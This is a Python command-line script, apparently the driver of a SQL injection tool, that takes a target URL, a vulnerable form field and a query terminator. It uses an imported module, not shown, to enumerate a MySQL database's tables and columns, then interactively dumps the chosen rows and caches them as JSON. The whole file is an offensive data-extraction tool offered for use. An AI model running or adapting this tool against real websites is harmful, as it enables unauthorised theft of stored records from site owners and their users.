#!/usr/bin/python
# 
# Enumerate details of a MySQL database through a form field that is vulnerable to SQL injection 
# Copyright (C) 2019
# Salman Raza <raza.salman@gmail.com>
#
# GNU General Public License v3.0
#
# This program is free software: you can redistribute it and/or modify it under the terms
# of the GNU General Public License as published by the Free Software Foundation, either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
# Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>

import argparse
import sys
from MySQLEnum import *
from Formatting import *
from builtins import input
import json


def show_banner():
    
    print(
    '''
     ______  _     _  _    _____  _       _______ ______  _     _ ______  
    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \ 
    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
                                                                    {}
    '''.format(clr.bgred(clr.yellow(clr.white("@pyrod"))))
    
    )

def construct_data(post_args, vuln_field):
    '''Construct the data that will be sent as a part of the GET or POST request to the target. One of these fields is specified as being vulnerable in the command line arguments, on which the SQL injection will be done.'''
    retval = {}
    
    if ":" not in post_args:

        print(clr.red("\n[!]") + "At least one parameter value must be set or if there is no parameter it should be left blank (E.g. -d 'param1:')\n   Exiting ...\n".format(vuln_field))
        exit(0)
    
    for i in post_args.split(","):
        
        param = i.split(":")
        retval[param[0]] = param[1]
        
    
    if vuln_field not in retval:
        
        print(clr.red("\n[!]") + "Vulnerable field '{}' not found in provided post arguments... exiting\n".format(vuln_field))
        exit(1)
    
    return retval

def show_enum_rows_option(target, keyinterrupt=False):
    
    msg = "Enumerate rows? [y/n, default:n]: "
    
    if keyinterrupt == True:
        
        msg = "\n\nEnumerate rows for another table? [y/n, default:n]: "
    
    
    enum_rows = input(msg)
        
    if enum_rows == "y":
        
        while True:
        
            enumerate_rows(target)
                
            again = input("Enumerate rows for another table? [y/n, default:n]: ")
                
            if again == "n":
                
                break
    else:
        
        exit(0)

def enumerate_rows(target):

    enumerated_rows = []
    
    selected_table = select_table(target.DB)
    
    print("\nTable selected: {}\n".format(clr.red(selected_table)))
    
    selected_col = select_col(target.DB, selected_table)
    
    selected_limit = select_row_limit(target.DB, selected_table)
    
    print("\nColumn selected: {}\n".format(clr.red(selected_col)))
    
    print("\nEnumerating rows for {}.{}\n".format(clr.red(selected_table), clr.red(selected_col)))
    
    try:
        
        rows = target.generate_rows(selected_col, selected_table, selected_limit)
        
        for row in rows:
            
            enumerated_rows.append(row)
            
        print(render_rows(enumerated_rows,selected_col))
            
        
    except KeyboardInterrupt:
    
        print("\nRow enumeration aborted, partial enumeration results for {}.{}:\n".format(clr.red(selected_table),clr.red(selected_col)))
        
        print(render_rows(enumerated_rows,selected_col))
        
        show_enum_rows_option(target, keyinterrupt=True)
    

def select_row_limit(db, selected_table):
    
    total_rows = int(db['tables'][selected_table]['row_count'])
    
    while True:
    
        selected_limit = input("Number of rows to enumerate [Total: {}]: ".format(total_rows))
        
        if selected_limit == '':
            
            selected_limit = total_rows
            
        else:
            
            selected_limit = int(selected_limit)
        
        if selected_limit > 0 and selected_limit <= total_rows:
        
            break
            
    return selected_limit
    

def select_col(db, selected_table):
    
    cols = db['tables'][selected_table]['cols']
    total_cols = int(db['tables'][selected_table]['col_count'])
    
    print(render_cols(cols))
    
    while True:
    
        col_index = int(input("Select Column to enumerate [{}-{}]: ".format("1",total_cols)))
        
        if col_index > 0 and col_index <= total_cols:
        
            break
            
    selected_col = list(cols.keys())[int(col_index)-1]
    
    return selected_col
    
def select_table(db):
    
    print(render_tables(db))
        
    tables = db['tables']
    total_tables = int(db['info']['table_count'])
        
    while True:
    
        table_index = int(input("Select Table [{}-{}]: ".format("1",total_tables)))
        
        print("table_index : {}".format(table_index))
        
        if table_index > 0 and table_index <=  total_tables:
        
            break
    
    selected_table = list(tables.keys())[int(table_index)-1]
    
    return selected_table

def get_file_name(url):
    
    return './{}.json'.format(url.split('/')[2])

def show_results(target):
    
    print_db_info(target.DB, format="table")
       
    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(target.DB['params']['url']))))
    
    print_table_info(target.DB, format="table")

def start(url=None,
            data=None,
            vuln_field=None,
            table_limit=None,
            debug=None,
            terminator=None,
            request_type=None,
            file_read=None):
            
    
    if file_read:
        
        file_name = get_file_name(url)
        
        if os.path.isfile(file_name):
            
            with open(file_name, 'r') as f:
                db = json.load(f)
                
            target = MYSQLENUM(target_url=db['params']['url'],
                        data=db['params']['data'],
                        vuln_field=db['params']['vuln_field'],
                        table_limit=db['params']['limit'],
                        debug=db['params']['debug'],
                        request_type=db['params']['request_type'],
                        terminator=db['params']['terminator']
                        )

            target.DB = db
            target.DB['params'] = target.get_params()
            
            show_results(target)
            show_enum_rows_option(target)
            
                
        else:
            
            print(clr.red("\n[!]") + "File '{}' not found for URL: {}\n   Exiting ...\n".format(file_name,url))
            exit(1)
        
    
    else:
    
        data = construct_data(data, vuln_field)
        
        print(clr.red("\nENUMERATING DATABASE ...\n"))
       
        target = MYSQLENUM(target_url=url,
                            data=data,
                            vuln_field=vuln_field,
                            table_limit=table_limit,
                            debug=debug,
                            request_type=request_type,
                            terminator=terminator
                            )
        target.enumerate()
        
        show_results(target)
        
        show_enum_rows_option(target)
    
    

if __name__ == '__main__':

    show_banner()

    parser = argparse.ArgumentParser()
    
    parser.add_argument("-f","--file_read", help="Read in previously enumerated file", action="store_true")
    
    parser.add_argument("-debug","--debug", help="Show debug messages : Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
    
    parser.add_argument("-u","--url", help="Full path to the vulnerable URL", required=True)
    
    parser.add_argument("-r","--request_type", help="Request type get=GET, post=POST", required='-f' not in sys.argv)
    
    parser.add_argument("-d","--data", help="Data parameters in the format 'parameter1:value1,parameter2:value2...'", required='-f' not in sys.argv)
    
    parser.add_argument("-v","--vuln_field", help="Vulnerable parameter from the data provided in the -d switch", required='-f' not in sys.argv)
    
    parser.add_argument("-limit","--table_limit", help="Limit the number of tables to be enumerated")
    
    parser.add_argument("-t","--terminator", help="The string to be appended at the end of the injected query, that will comment out rest of the part after the injected query", required='-f' not in sys.argv)
    
    args = parser.parse_args()
    
    if '-f' not in sys.argv:

        if args.request_type not in ['get','post']:
            
            parser.error("Invalid request type: Use get=GET, post=POST")
            
        if (args.debug is not None) and (args.debug not in ['w','i','d','e','c']):
            
            parser.error("Invalid debug level setting: Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
        
        
    
    start(url=args.url,
        data=args.data,
        vuln_field=args.vuln_field,
        table_limit=args.table_limit,
        debug=args.debug,
        terminator=args.terminator,
        request_type=args.request_type,
        file_read=args.file_read)

